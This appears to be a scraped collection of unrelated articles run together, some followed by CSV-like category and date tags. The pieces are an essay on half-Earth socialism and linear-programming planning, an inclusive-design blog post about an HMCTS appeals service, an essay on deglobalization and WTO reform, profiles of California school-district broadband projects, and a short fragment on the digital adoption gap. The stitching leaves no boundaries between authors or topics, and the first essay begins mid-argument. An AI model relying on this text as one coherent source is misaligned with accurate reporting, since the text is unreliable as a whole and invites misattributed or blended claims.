Half-Earth socialism is a scientific utopian project, but that does not mean we are restricted to the tools and concepts that Neurath himself used. Even Kantorovich’s sophisticated mathematics is hardly cutting edge now. While the static, one-off calculations made using linear programming are a valuable tool in managing any complicated project — the method is ubiquitous in contemporary applied mathematics, including in planning renewable energy systems — global planners will need other tools to allow local administrators to meet the needs of the people they serve, while simultaneously achieving global goals such as rewilding or long-distance trade.

In natura calculation does not mean replacing money with an inefficient barter economy (x kilowatt-hours of power equals y bushels of grain) but rather uses an information system that allows one to see how different goods relate to one another as a whole. Meeting the needs of nature and humanity is fundamentally a material goal, measured in food and carbon molecules, and seeing the world in natural units allows us to directly confront trade-offs without the obfuscation of money.

Many previously proposed planning schemes rely on labor time as a universal metric to organize production and distribution. Such schemes expend enormous effort in designing a system that corrects for the inevitable distortions created by this strange kind of money or “time chits” because it is difficult to account for the fact that some workers are more effective than others, or some work is more skilled. The goal of socialism is not to replicate the market, but to allow humanity to consciously regulate itself and its interchange with nature.

As a thought experiment, bracketing the practical politics for a moment, imagine that an eco-socialist revolution happens tomorrow. Perhaps the United Nations would become a global parliament, with nations and regions acting as federated units with their own devolved powers. Whatever such a world government looks like, it must be democratic and broad-based to avoid missteps made by previous socialist regimes.

The new regime, composed of representatives from around the world, must immediately start the hard work of planning the world economy, but first they commission social engineers to do some quick calculations on balancing human needs with planetary boundaries and assign them to a new bureau of our planetary future called, say, Gosplant (forgive us). Think of it as some initial back-of-the-envelope estimates of the tradeoffs our imagined parliament will face.

Gosplant’s initial goal is to devise several futures that illuminate how much of nature can or should be humanized to furnish the global economy with the necessary resources. It might model futures that allot higher or lower per capita energy use, assume different rates of technological or infrastructural progress and commit to varying degrees of rewilding, making visible the different obligations people will have to shoulder if they wish to achieve certain ecological goals.

For even a simple version of this simulation to work, however, information must be gathered on a global scale and protocols established that can translate chaotic reality into natural units. The scientific corpus on planetary boundaries allows Gosplant planners to mathematically express two essential restrictions: limiting extraction to keep the biosphere healthy, while equitably distributing enough natural resources to supply human needs.

In one possible plan, half the Earth will be set aside for rewilding to limit the ecocide of the sixth extinction. This is the “half-Earth” that inspires “half-Earth socialism,” a concept championed by E. O. Wilson and other conservationists because land-use change — often carried out by the meat industry — is the principal driver of the current mass extinction event. Protecting so much land will require significant changes (especially in terms of meat consumption), but conservation must abjure its colonial heritage. There are strong ethical and even environmental reasons for a radical left conservation program; after all, Indigenous lands sequester more carbon and harbor more biodiversity than nature preserves. Indeed, half-Earth socialism complements the global Land Back movement.

“Although critics of the left often accuse socialists of magical thinking, the real fantasy is a future where capitalism is constrained within planetary boundaries.”

On top of the territorial restriction of half the Earth being rewilded, scientists have provided global figures on a myriad of other ecological limits, from the maximum amount of nitrogen and phosphorus that can be used as fertilizer (68 million and 6.8 million tons per year respectively) without causing mass eutrophication to the freshwater available for consumption, to the carbon that can be emitted (1.8 tons per person per year for 2 degrees Celsius of warming, even less for the more ambitious 1.5-degree target). Further restrictions on acceptable levels of pollution can be taken from the public health literature — for example, fine particulate matter suspended in the atmosphere should have an annual mean of 10 micrograms per cubic meter or less. None of these limits should be taken as immutable — scientific knowledge reflects not only the latest technique and theory but also social concerns that are far from “objective.” Our imagined parliament would commission a variety of plans, embodying a variety of possible futures.

To plan for energy and food production, Gosplant will make several plans with different power quotas, like that proposed by the 2000-Watt Society, and ensure that everyone in the world will have access to a nutritious diet. These choices, like many of Gosplant’s other constraints, are all social decisions.

Some scholars have ventured energy quotas lower than 500 watts, which is less than a twentieth of current U.S. usage. More conservative targets are possible — they would just require spartan restrictions on new clothing, appliances, transportation, electricity and living space. Gosplant need not make this choice for everyone; they can generate many plans, each with its own energy quota, and leave it to the people and their representatives to decide which plan best balances the needs of the biosphere and humanity.

Linear programming is a powerful protocol that can turn these various constraints (expressed in natural units) into concrete plans. Anyone can toss in limits on resource use and the minimum needs of humanity and turn the crank. The Gosplant social engineers need not harbor any explicit preference between diets, energy systems and other variables. There is no inherent requirement in their linear programming model that the world be vegan, or that all power sources be renewable.

In our basic example, the planners set two main goals — providing enough food and energy for everyone’s basic needs and staying within planetary boundaries — as well as the basic productive configuration needed to satisfy those goals by different means. The final piece of the puzzle is called the objective function: the quantity that the linear programming algorithm must maximize or minimize.

A capitalist firm might decide to minimize costs when running a linear programming algorithm on its own operations; the Gosplant planners, on the other hand, might opt to minimize land use, carbon emissions or some other metric that combines multiple goals. The linear programming model will then output the best mixture of energy and food sources with respect to this objective function or tell the user that the plan is not possible within the given constraints. (We should emphasize that what we are doing here is a toy example, designed to illustrate how a future society might weigh trade-offs in natural units, and is not trying to argue that simple linear optimization can run the world.)

To understand how linear programming digests its inputs, consider the question of diet. Everyone could eat a healthy diet, but there are multiple ways Gosplant could achieve this goal. If the great majority of people were omnivorous, this would impose a per capita cost of around 2.5 acres of land and 2.25 tons of carbon per year. Vegetarianism does much better, taking up only a third of an acre per person and 1.5 tons of carbon. Veganism pushes land use down a little further and emissions more substantially, to just over a ton per person. A slew of other reforms could — and indeed must — improve these figures much more.

“Meeting the needs of nature and humanity is fundamentally a material goal, measured in food and carbon molecules, and seeing the world in natural units allows us to directly confront trade-offs without the obfuscation of money.”

Even though the Gosplant bureaucrats do not explicitly prefer any diet, their linear programming algorithm will likely opt for veganism because it satisfies the requirement of feeding everyone with the smallest environmental impact. If society resists shifting to an herbivorous diet, the planners could include some meat production. However, increased emissions and agricultural land use will cut into other aspects of the total plan. Linear programming is only a tool, but it is one that allows the Neurathian politics of seeing and democratically deciding which trade-offs to accept.

The transition to a vegan world would impose greater sacrifices on the carnivorous global north, which is only fair — the average North American eats almost 10 times more meat than the average African. A nearly vegan “planetary health diet” outlined by a recent EAT-Lancet study proposes a 2,500-calorie quota per person that would not only lessen humanity’s impact on the environment but also prevent an estimated 11 million deaths per year. There would be less malnutrition, as well as fewer conditions such as type 2 diabetes and heart disease caused by the over-consumption of meat and certain processed foods. Replacing livestock fodder with pulses and legumes would increase natural nitrogen fixation (and thus reduce the need for a fossil-fuel-dependent fertilizer industry), while allowing pasture to be rewilded.

A more fully developed linear programming model might account for these benefits in more granular detail, better reflecting the myriad social, ethical and ecological benefits of veganism. The world’s moral issues will never be solved by a computer, but algorithmic planning can clarify the discussion.

The social engineers would address energy in a similar manner to food. Each person on Earth would need to be supplied a power quota, whether 2,000 watts or something else, but again there are many ways to do so. Suppose Gosplant has eight main sources of energy to choose from: photovoltaic solar cells, concentrated solar power stations, wind turbines, biofuels, nuclear, methane (“natural gas”), coal and petroleum. For simplicity’s sake, and because the anti-nuclear movement was a vital constituent in the Half-Earth socialist revolution, the planners do not include nuclear energy in their initial calculations.

Each of these power sources has a cost associated with it, expressed in natural units of land area and carbon emissions, but not money. Biofuels, for example, are hypothetically zero-carbon (though this is often not true) but have a low “power density.” Power density is the relationship between energy and land area, often expressed as watts per square meter. While coal or petroleum could have a power density of 10,000 watts per square meter, biofuels often boast a measly 0.5. This means that several orders of magnitude more land is required to produce a similar amount of energy as fossil fuels. Solar and wind are the best hope for renewables, with power density of 2-20 watts per square meter — quite a bit higher than biofuels but still much less than fossil fuels. The immediate problem, however, is that the majority of power consumption (e.g., transportation, industry) is not on the electrical grid and cannot yet take full advantage of these power sources, and are currently reliant on fossil fuels.

A more sophisticated model could add other costs, such as the environmental and social costs of mining various materials. The idea, however, remains simple: Linear programming requires Gosplant only to lay out goals that have been democratically decided upon, as well as collect the information on the material costs of each variable.

The long-term energy goals of Half-Earth socialism are apparent: total electrification of industry and transportation and making generous use of clean hydrogen where fuels remain necessary, with as much power as possible supplied by wind and solar. Yet, the transformation would be extraordinary: Supplying the necessary electricity would require a 40-fold increase in wind power and a 170-fold increase in photovoltaics as of 2015. As the energy scholar Vaclav Smil points out, “such a ramping-up of all kinds of capacities — design, permitting, financing, engineering, construction, all going up between one and five orders of magnitude in less than two decades — is far, far beyond anything that has been witnessed in more than a century of developing modern energy systems.” Even an eco-socialist society that is single-mindedly committed to overcoming the energy challenge would struggle to pull off such a change.

After calculating the land and emissions costs of various diets and energy systems, Gosplant bureaucrats would have enough data to run a simplified linear programming model and supply a basic global plan. Like some early IAMs, such as William Nordhaus’ Nobel Prize-winning DICE model, the program we built is basic enough to run on an ordinary laptop in less than a second. However, like Nordhaus’ model, ours is far too simple to be used in real life. (Such limitations never stop economists.)

Planners could set several constraints, including an energy quota; various planetary boundaries, such as global temperature or the amount of land set aside for wildlife; and the state of infrastructure and industry (e.g., to what extent are they electrified?).

Gosplant would have to decide whether to minimize land use or CO2 emissions, in addition to setting energy and food quotas. The numbers underpinning these variables are based on the current state of technology in various fields — so no cold fusion or fast-breeder reactors. The only futuristic element in our model is population, which we set at 10 billion people — the estimated global population in 2050.

Where would the immediate difficulties for a transition lie? Pessimistically, Gosplant engineers might assume that transportation and industry remain unelectrified and consume the bulk of energy, as is the case in the U.S. today, and thus require vast quantities of fossil fuels or biofuels to meet humanity’s needs. So they have three main goals: provide a 2,000-watt quota for all, limit warming to 2 degrees Celsius and rewild half the planet.

With their goals settled, all the Gosplant planners need to do is pick an objective function. They decide to minimize land use. However, when the bureau runs its model, it finds that the plan’s goals cannot be met, even if everyone became vegan. Biofuels would compose such a large share of the global energy budget, there would be no way to grow enough food and energy crops without transgressing the threshold of the half-Earth.

This would then entail geoengineering or biodiversity loss caused by the huge biofuel plantations. If they wanted to, Gosplant could add these terrible possibilities into the model and relax their planetary boundary constraints. Importantly, any model actually used for planning should simulate change over time, with emissions above the quota now and lower or even negative emissions in the future. Although things seem dire, it is too early to give up on utopia.

The planners have several options. One would be to reduce the energy quota to 1,500 watts, which would make the rest of the plan viable even without electrifying transit and industry. The model shows that 57% of the planet’s habitable surface could be left to nature (up from 15% now), 26% would be dedicated to biofuels (up from about 0.4% now) and 18% to agriculture (down from 50% now).

“Every part of half-Earth socialism should be seen not as an unquestionable truth but as a starting point for a deeper discussion of how socialism should function in an age of ecological crisis.”

The assumption that allows this plan to work is that virtually everyone would be vegan (with exceptions made for Indigenous nations and perhaps some traditional pastoralists). The model also shows that, because energy use would be so low, methane could be used for some industrial processes and electrical generation while still limiting warming to 2 degrees Celsius.

Although the plan is feasible, the planners are reluctant to create a massive biofuel industry. They devise another option by simulating strict restrictions on private car ownership and unnecessary industrial processes, which halves the demand for solid and liquid fuels. In this modified plan, biofuel crops take up only 21% of the planet’s surface. An even more ambitious option reduces the energy quota to 1,000 watts and would require biofuel plantations on only 13% of Earth’s surface, while reserving an astounding 70% for wildlife.

Wonderful news! Even with quite pessimistic assumptions, Gosplant can plot several paths towards an equal, sustainable planet. However, the blueprint drafting cannot stop there. Anticipating possible demands from climate activists, the Gosplant planners devise another blueprint that opts for the courageous goal of limiting warming to only 1.5 degrees Celsius. After rerunning the algorithm with the 1,500-watt quota and the restricted fuel-use scenario, their model shows that this goal will require the biofuel sector to expand to over 25% of the planet’s surface (up from 21% before). Warming would stay below 1.5 degrees Celsius, but at the cost of having taken more land from nature due to much stricter restrictions on fossil fuels.

There are no easy solutions here, and our Gosplant model clarifies the trade-offs required in every plan. Ultimately, a global parliament would have to take a vote on whether minimizing climate change or preserving habitat is the more urgent planetary goal — or whether the planners should go back to the drawing board and come up with more arrangements.

Other options become possible with new infrastructure and technology. Perhaps there is a breakthrough in “green” hydrogen fuels, which allows the Gosplant social engineers to pursue the goal of total electrification. This leads to their most ambitious plan yet: an energy quota of 2,000 watts and 50% of land rewilded, all within the limit of 1.5 degrees Celsius warming.

In this blueprint, electrification allows Gosplant to take full advantage of solar and wind power, which have much higher power densities than biofuels; with land use minimized, a whopping 81% of land can be left to nature (thus preserving 95% of all species). The planners find that up to 24% of the population could be omnivores in this scenario, as land constraints are so relaxed as to permit the return of some animal husbandry. Of course, a vibrant animal-rights movement would still oppose this for ethical reasons, while epidemiologists might warn against the threat of zoonotic disease. The point, however, is that the social engineers’ plans could and would evolve alongside infrastructural and political change.

Our model’s simplicity leads it to overestimate the role of biofuels in a real-world transition: In reality, a good strategy might be temporary restrictions coupled with rapid electrification, with some very limited carbon removal technologies used to mop up the last of the “hard-to-decarbonize” emissions like cement clinker. Even in this case, though, the land/power tradeoff remains important. Carbon removal, whether through rewilding or BECCS, takes up a large amount of land.

“A socialist society confronts these challenges with open eyes, rather than trusting the mythical powers of the market.”

Imagine that, for the short term, the global parliament opts for the second modified plan, with a 1,500-watt energy quota and restrictions on fuel use. It is the best fit for present circumstances while allowing energy use to grow in the future as more sustainable infrastructures are built. (That quota would seem austere in the global north, though relatively painless for the south.)

The government agrees to steadily reduce private car ownership to the point of complete abolition, one compacted Ferrari at a time. The steel thus saved can be recycled into trams and buses, while the remaining cars (which would run on electricity, hydrogen or biofuels) are pooled and signed out by individuals or families. While Gosplant liquidates the suburban real estate market early on, millions of construction workers and tradespeople find work retrofitting buildings to conserve energy and adapting private mansions and corporate headquarters to communal use.

Private lawns and golf courses are likewise either rewilded or turned into community gardens. Wide-ranging improvements to industrial processes to reduce pollution, fuel use and waste are undertaken in just about every industry. Large swathes of manufacturing become rationalized when “planned obsolescence” itself is made obsolete. Resources are redirected toward building solar panels, wind turbines, super-efficient insulation and railways.

Much of the world’s pasture is converted into biofuel plantations for the short-term decarbonization of transportation and industry, while the remainder is rewilded, which in turn requires an expanded cadre of ecologists and foresters trained in both conventional science and traditional Indigenous knowledge.

Gosplant’s job is not to dictate what the future should look like but to supply the public and its representatives with blueprints. For Gosplant, the process is more important than the final product.

Every part of half-Earth socialism should be seen not as an unquestionable truth but as a starting point for a deeper discussion of how socialism should function in an age of ecological crisis. Planners, parliaments and people will never have full knowledge of nature and society, which will lead to blind spots that even the most meticulous plans will not be able to perfectly address. These weaknesses are to be expected in any plan that confronts the catastrophes of the Anthropocene.

But our hope is that half-Earth socialism will differ by producing a society that constantly revises itself towards a more just and environmentally stable civilization through conscious choice. This does not mean that creating a global utopia will be easy. Yet, a socialist society confronts this challenge with open eyes, rather than trusting the mythical powers of the market. In such a struggle lies the possibility of human freedom on a self-willed natural world.

Inclusive design isn’t a nice to have, it’s a universal need. 14.1 million people in the UK live with a disability(1), but only 2% of the world’s most popular websites are accessible(2) putting up unnecessary barriers to inclusion and sales.

While there’s lots of goodwill towards building more inclusive services, we’re not making enough change. Over 30% of people with disabilities report poor digital experiences when buying groceries, booking trains and picking up a new outfit due to a lack of inclusion(3), a figure which only grows when you consider other kinds of exclusion like digital confidence.

We understand that often what’s holding service teams back is nervousness around the range of things you need to do and making mistakes along the way. Unfortunately, there’s no cookie-cutter approach for what inclusive solutions look like. But there are approaches that underpin the inclusive design, no matter the project.

That’s why we wanted to demystify the process by sharing our inclusive design principles with you, alongside some examples of what they look like in practice, using our award-winning(4) work redesigning the Immigration and Asylum appeals service for HM Courts and Tribunals Service (HMCTS).

Recognise that exclusion is often subconscious

Exclusion happens when we solve problems using our own biases. We need to recognise our subconscious biases and make decisions based on input from voices beyond our own.

At HMCTS that meant committing to research and making design decisions with our full spectrum of stakeholders from the outset.

Build-in inclusive design thinking from the start

You can’t retrofit inclusion; it needs to be a part of decision-making throughout the design process.

Everyone in our team was responsible for inclusive design, from research through to development; ensuring this understanding and responsibility for inclusion extended across our stakeholders. We shared first-hand experiences of appellants and asked stakeholders to engage with those experiences, acting as researchers, then design based on those insights. This shared storytelling was at the heart of our approach, galvanising business-wide support.

Engage and research widely

To design inclusively you need to work with a diverse range of people to understand needs, strengths, behaviours and opportunities.

Prior to our work with HMCTS, very little research had been done with appellants – they were considered too hard to recruit and previous teams had been unsure of how to start. The challenge of recruiting seldom heard participants can be intimidating, but when designing inclusively it is vital. Our approach was to learn from and build trust with charities, who offered their spaces and networks to support our research, allowing us to speak to a range of appellants.

Don’t be afraid to reach out, if your research is respectful and valuable to participants, you might be surprised.

Learn from diversity

People are experts in how they do things. Someone who’s dyslexic might have a way of approaching a task that someone who isn’t might never have considered.

We believe the best way to learn from diversity, is to design with a diverse group of stakeholders. At HMCTS, we established a wide-ranging design community who co-designed the service with us, sharing their expertise and making decisions about a service that impacted them. At every stage, we shared designs and asked a range of users to test and help improve them based on their expertise.

Make services feel familiar

Familiar tasks are easier to complete and make us feel at ease. Avoid trying to reinvent the wheel when it comes to simple interactions and find the patterns users are already following.

Based on our research, we knew that appellants were familiar with talking about their appeals in terms of what had happened and when rather than referring to different types of documents. So, we mirrored this in the design of the service, showing appellants a building timeline of appeal activities.

Provide easy access to human assistance

We should be aiming to design services that support everyone to succeed the first time without support. But that isn’t always possible. Sometimes we all need help and want services that provide the right support when we need it.

For the appeals service, that meant offering clear signposting to our phone line that offered interpretation when appellants needed help understanding tasks and links to support organisations when appellants wanted someone to talk to about their appeal.

Keep everything simple

Making things simple makes them easier for everyone. Wherever you can, reduce complexity in your journeys, language, and interface.

An impactful example of this is our work with the judiciary to simplify complex legal language into plain English with a reading age of 5, making it understandable for everyone, and allowing us to shorten the appeal form to 10% of its original size.

Digital inclusion is a complex and ever-evolving subject. The realisation comes before action, so the first step is to identify and embrace the opportunity, then you can begin to delve into the requirements of users to ensure that everyone who needs your service can use it. Our principles are not an exhaustive guide but are an approach we’ve found can make a huge difference. We’re always keen to learn more and work together, so we’d love to hear your experiences of designing inclusive services.

They predict that the steps that firms and governments are taking in response to the current crises will effectively “deglobalize” the world economy: for instance, the business practice of “just-in-time” value chains that move materials across borders just before they are needed could shift to a “just-in-case” model that focuses on maintaining large inventories to safeguard against supply chain disruptions. This also means that the offshoring of production to the most cost-effective location could give way to so-called re-, near-, and friend-shoring: putting production in closer or friendlier destinations that align with the home country’s political values and lower a company’s exposure to external risks.

But there are good reasons to be skeptical of the globalization doomsayers. Of course, it is still too early to evaluate the long-term effects of the recent disruptions. For now, though, evidence suggests that global economic integration continues, even if it is slowing and changing. This evolution also means that traditional measurements of global integration are becoming obsolete as value chains adapt to new realities. For instance, one historical metric of globalization is the ratio of merchandise trade to global GDP, which measures the relative importance of international trade of goods in an economy. That ratio has declined from its peak before the 2008 global financial crisis, suggesting that globalization is indeed on the retreat.

Yet the ratio of services trade to global GDP, which measures the relative importance of international trade in services such as sales, marketing, management, administration, engineering, and education, has increased during the last 15 years, fueled by the rapid growth of cross-border digital networks. At the same time, the falling ratio of merchandise trade to global GDP should also come as no surprise: the economic integration of China, whose participation in global value chains was a key driver of globalization over recent decades, is facing diminishing returns. Moreover, China’s economy is now undergoing a structural shift toward domestic consumption and services. China’s weighty role in the world economy masks the fact that many other economies, such as Bangladesh and Vietnam, are continuing to integrate ever more deeply into global value chains.

Other factors also indicate that global economic integration is here to stay. Global exports of goods and services, for example, are still growing steadily in absolute terms. Even bilateral trade between China and the United States, geopolitical rivals that are increasingly at odds, continues to reach record heights—in the face of a trade war and a pandemic, no less. Moreover, notwithstanding the political rhetoric of their governments, many European and U.S. firms are doubling down on their investments in China. Other indicators point in a similar direction: both the DHL Global Connectedness Index and the KOF Globalisation Index indicate that global integration is deepening in various economic, social, and political dimensions. In the short run, there is, therefore, a discrepancy between business realities and political objectives: for the most part, discussion of so-called decoupling is occurring in policy planning rooms, not corporate boardrooms. Such contradictions may expose the limits of economic statecraft.

This is not to say that the political choice to curb further integration of the global economy will not have consequences, but for now, deglobalization is mostly a point of principle rather than of practice. Nonetheless, it is clear that the international trading system and the course of globalization are being put under pressure by new fault lines, namely, great-power competition, digital transformation, inequality, fallout from the pandemic, and climate change. Given these rising challenges, there are steps that the members of the World Trade Organization must take to prevent deglobalization talk from becoming a reality.

RETHINKING TRADE

The current upheavals certainly have the potential to transform the global economy. Perhaps most important, China’s rise and Russia’s invasion of Ukraine are causing the geopolitical structure underpinning global trade to undergo a dramatic shift. Although Russia may soon be relegated to the sidelines, the rivalry between the United States and China will continue to be the most defining feature of international politics for years to come. In the face of mounting tensions, Washington and Beijing are already trying to decouple sensitive segments of their economies to limit the availability of dual-use technology—designs that can be used for both peaceful and military aims—for the other side. Countries and regions that have deep economic ties with both the United States and China, such as the European Union, are increasingly caught in the middle. This rift, however, is mitigated by the fact that major global challenges such as climate change and public health will require global cooperation, so the two sides will have to keep talking to each other. What the former Australian Prime Minister Kevin Rudd calls “managed strategic competition” will therefore predominantly play out in the economic domain, with significant implications for the trading system. For example, Beijing is pushing for greater internationalization of the renminbi to conduct more of its trade in a currency that is independent of the U.S. dollar, insulating it from U.S. economic weapons such as sanctions. Both countries are building more and more domestic capacity for critical supply chains in strategic sectors, such as semiconductors, to lessen their dependence on the other. In the digital sphere, they are advancing different, if not opposite, visions of data governance, with the United States advocating for the free flow of data and China seeking to stifle it.

Recent technological developments are also changing the nature of trade itself. The digital transformation, for instance, is redefining how business is conducted across borders, and stay-at-home measures to fight the COVID-19 pandemic have only accelerated this change. More parcels are crossing borders than ever before as a result of the wider use of online platforms to buy and sell goods, shifting the relationship between businesses and consumers toward digital mediation and driving new global markets for small and medium-sized businesses. The digital platform and app economies are creating international ecosystems with products such as social networks and media streaming that were inconceivable when WTO members began discussing the implications of electronic commerce in the mid-1990s. Artificial intelligence applications such as machine translation and image recognition are generating new efficiencies and value in cross-border exchanges. Telework is changing global travel patterns and allows service providers in developing countries to directly participate in the world’s largest consumer markets.

These examples illustrate how digital trade across borders is changing so quickly that it is presenting the trading system with a range of thorny challenges, including consumer safety, cybersecurity, ethics, competition policy, and taxation. Although for many years the Internet was a self-regulated space, it has become subject to intergovernmental negotiations, such as the WTO’s Joint Statement on Electronic Commerce, which seeks to develop global rules on digital trade; digital trade chapters in regional trade agreements such as the United States–Mexico–Canada Agreement; and new, stand-alone digital economy agreements, such as the Digital Economy Partnership Agreement between Chile, New Zealand, and Singapore. But the emergence of different models to govern the flow and storage of data, which is crucial for digital services and other forms of trade, also suggests we are entering a new era in which globalization occurs with firewalls.

The multilateral trading system remains the backbone of the globalized economy.

Amid growing socioeconomic dislocation and political upheaval in many parts of the world, countries will also need to reckon with the uneven distribution of the rewards of globalization—and come up with policies to address it. Increased trade boosts overall welfare but, by definition, produces winners and losers. To avoid social disruptions, many countries liberalizing their economies therefore implement trade adjustment programs that provide aid to workers adversely affected by increased imports or rely on social safety nets to compensate and retrain employees. Although there is evidence that countries with more robust social safety nets are also more open to trade, it is also clear that income inequality within many countries has increased during the last decades as economic integration has accelerated. What is less clear, however, is how much of this inequality can be attributed to exposure to foreign competition—the so-called China shock, in which rising Chinese exports led to a loss of manufacturing employment in high-income countries—and how much of it can be attributed to creative destruction from technological change, in which more efficient economic structures supersede old ones. Regardless of the causes, a growing segment of the public in many countries has come to view trade as the main culprit behind inequality, an assumption that has fueled anti-trade politicians, such as Donald Trump, who seek to reduce the exposure of their countries to the global economy.

When the coronavirus sent the global economy into a tailspin, states took unprecedented steps to help their citizens and businesses weather the pandemic. G7 economies, for example, put in place support schemes amounting to $12 trillion, about one-third of their combined GDP. These were, without a doubt, necessary and timely steps to address the crisis. Some efforts, such as the EU’s State Aid Temporary Framework, were specifically designed to avoid distortions to international competition. Nonetheless, given the extraordinary size of the funds that governments disbursed quickly, these efforts are certain to tilt the playing field and have an impact on global trade, at least in the short to medium term.

Finally, the climate crisis should compel governments and policy experts to fundamentally rethink how the trading system interacts with the environment. In the long run, the impact of climate change on food production and water-supply networks will dramatically alter the nature of agricultural trade. Moreover, the growing adoption by many governments of green energy production may well end by the middle of the century the iron grip that fossil fuels have long had over geopolitics, a transformation that has the potential to shift political alliances and reconfigure trade flows. In the shorter run, policies to reduce greenhouse gas emissions will not be contained by international borders, and climate-conscious governments may increasingly resort to carbon border adjustment mechanisms—which impose a cost on carbon-intensive imports such as cement and steel—to avoid carbon leakage, where actors outsource greenhouse gas emissions to countries with lower production standards.

The many vulnerabilities created by continued globalization require firms and governments to reprice the risks of international trade. They also pose new challenges for the trading system, which was primarily built to address the negative effects of protectionism. To survive in the twenty-first century, the multilateral order must learn to address the effects of precautionism—the desire by consumers, firms, and governments to limit their exposure to the risks from participation in the global economy.

ESCAPING A SELF-FULFILLING PROPHECY

This is where the members of the World Trade Organization can—and must—step in. The WTO is not a world government and cannot be expected to solve all problems. At the same time, the WTO has played a crucial role in forging and underpinning the rules-based trading system that sustained globalization over the last three decades, a time during which global per capita income almost doubled. Although the challenges the world faces today may be unique, it is also important to recall that political leaders and policy experts have debated regionalization for as long as the WTO has existed. The proliferation of regional trade agreements, expanding from 55 in 1995 to 355 in 2022, seems to support the view that the system has been fragmenting for some time. However, at most one-third of world merchandise trade has preferential tariffs that go beyond the nondiscriminatory WTO rates, and even the degree to which firms use these trade preferences is an open question. As it stands, the multilateral trading system therefore remains the backbone of the globalized economy. Of course, if multilateral trade rules are not updated to address twenty-first-century challenges, countries could increasingly fall back on the expanded network of regional trade agreements. But the economic inefficiencies that such fragmentation entails would leave all WTO members worse off and hurt the poorest countries the most.

If WTO members fail to move quickly, deglobalization could become a self-fulfilling prophecy.

Managing the new fault lines of globalization will be a challenge—one that WTO members must rise to meet. The 12th ministerial conference will focus on fisheries subsidies and vaccine equity, which are important issues in their own right. But tackling these issues will not resolve the deeper structural challenges facing the multilateral trading system. If WTO members want the current order to survive, they urgently need to forge a shared understanding of how geopolitics, technology, inequality, subsidies, and climate change are affecting international trade. Many things stand in the way of this goal: for one, it is an open question to what extent WTO members can weaponize trade in the name of security, as in the case of Western sanctions against Russia, without causing the system to implode on itself. Structural divisions between competing data-governance models present a challenge for a plurilateral agreement on electronic commerce and may shift the locus for regulating digital trade elsewhere. So-called worker-centered trade policies must not ignore the fate of workers in the developing world, or they could end up fueling populist movements in some developing countries that undermine the rules-based system even further. WTO members will also need to find an arrangement that accommodates the vastly expanded subsidies that many countries have been using to address the economic impact of the pandemic, or risk a harmful subsidy race. Finally, uneven emissions and the growing political support in many countries for efforts to address carbon leakage must induce reforms of the multilateral trading system to bring it in line with the goals of the Paris Agreement.

In the absence of meaningful reform, anti-trade political forces may eventually succeed at tearing the integrated global economy apart. But for now, fears about deglobalization have little grounding in economic reality, and the multilateral trading system continues to provide an important public good that delivers substantial benefits to people everywhere. At the same time, the current wave of inflation serves as a reminder that a less predictable and more volatile path of globalization would come at a high economic and political cost to all. Recognizing this, WTO members can take initial concrete steps that improve the governance of the institution and could help them to tackle the more complex issues facing the multilateral trading system. These include increased transparency; reform of the WTO’s appellate body, its main dispute-settlement mechanism; a right of initiative for the secretariat, which would empower WTO staff to develop constructive proposals; and more cooperation in plurilateral initiatives, such as the Trade and Environmental Sustainability Structured Discussions, to build momentum on collective initiatives that address the thorny issues facing the global economy. The consequences of inaction are dire: if WTO members fail to move quickly, deglobalization could become a self-fulfilling prophecy.",Digital Inequality,2022-06-09 04:25:43

Most of these districts began planning projects to address the digital divide prior to the pandemic. While there are other examples of more recent, COVID-inspired initiatives underway, we highlight these established programs as ones that are now well positioned to scale up or apply for emergency federal funding to accelerate implementation.

These efforts also share another element in common: a focus on providing connectivity to the broader community, not just to the students served in their particular jurisdiction. This wider lens may limit the initiatives’ eligibility for programs that stipulate a strict educational focus, but as the pandemic’s shift to distance learning has demonstrated, the distinction between resources used solely by students for educational purposes, and those used by other household members for other essential functions, may be an unhelpful one.

Imperial County Office of Education, BorderLink

The Imperial County Office of Education serves more than 35,000 K–12 students. Over 90 percent of students are Latino and nearly 80 percent are eligible for free or reduced-price lunch. In addition, nearly 40 percent of students are English Learners/emergent bilinguals. Two decades ago, the Imperial Valley Telecommunications Authority—a collaborative of 35 agencies including K–12 school districts, city governments, the Imperial County Office of Education, Imperial Community College, and San Diego State University—established a fiber optic network to provide network and internet services to over 120 educational and public agencies throughout the county. The county launched a pilot program in 2017–18 to create an off-campus LTE network to bring high-speed wireless connectivity to students in local school districts.

Fresno Unified School District, Private LTE Network

Fresno Unified is the third-largest district in California, serving more than 73,000 students. Nearly 90 percent of students are eligible for free or reduced-price lunch and about 70 percent are Latino. The district embarked on a Personalized Learning Initiative (PLI) in 2016 that leveraged technology and digital tools to deliver personalized, blended learning. Implementation of the initiative revealed the need for long-term off-campus digital access. The district’s early experience during distance learning also revealed significant variations in the quality and capacity of neighborhood networks. For example, cellular carriers have fewer cell towers in poorer neighborhoods. The district leveraged its fiber-optic backhaul and school buildings as platforms to deploy a private LTE service to students in the southern region of Fresno. During Phase I, the district deployed LTE at 15 school-facilities-as-towers covering about 20 square miles and supporting more than 6,500 concurrent student connections.

Lindsay Unified School District, Community Wi-fi Network

Lindsay Unified is a small, rural district serving about 4,000 students in Tulare County. Nearly all (95%) students are Latino, and 90 percent are eligible for free or reduced-price lunch. More than one in three students are English Learners/emergent bilinguals. The district’s Strategic Initiative emphasized the need for ubiquitous technology access outside of school hours: it makes maximum use of technology for learning, and all curriculum is online. After the district provided devices for students to access online curriculum, the district learned that as many as 60 percent of students did not have internet at home, and for those that were connected, the speed was too low (less than 1.5 mpbs) to support distance learning. Starting in 2012–13, the district built a community Wi-fi network to deliver high-speed internet to students at home. The district’s community Wi-fi network relies on a private LTE and an unlicensed 5GHz Spectrum, and the district is currently building out a Citizens Broadband Radio Service (CBRS) to cover densely populated areas that cannot be reached with 5G or enough LTE density.

Ventura County Office of Education, VCEDNET

Ventura County is home to more than 135,000 students, 60 percent of whom are Latino. The Ventura County Education Network (VCEDNET) is a federally registered internet service provider that delivers internet connectivity and hosted services to school districts, charter schools, and private schools in Ventura County. The network was conceived many years ago, and over time it has moved from dial-up to microwave to fiber. About 20 percent of the county’s population in the mountain areas are unconnected—the topographical challenges make it cost-prohibitive. The Ventura County Office of Education is having ongoing conversations with the Broadband Consortium of the Pacific Coast to bring internet to those families, and the recent federal and state stimulus dollars provide additional resources for this effort.",Digital Inequality,2021-10-25 22:29:34

The second major element of the digital divide is an adoption gap, which Levin says is a function of user readiness and a lack of digital literacy skills. There is also a clear affordability gap, meaning users simply cannot afford to pay for the broadband service that is technically available to them. The affordability gap is largely an urban and suburban phenomenon, experts say.

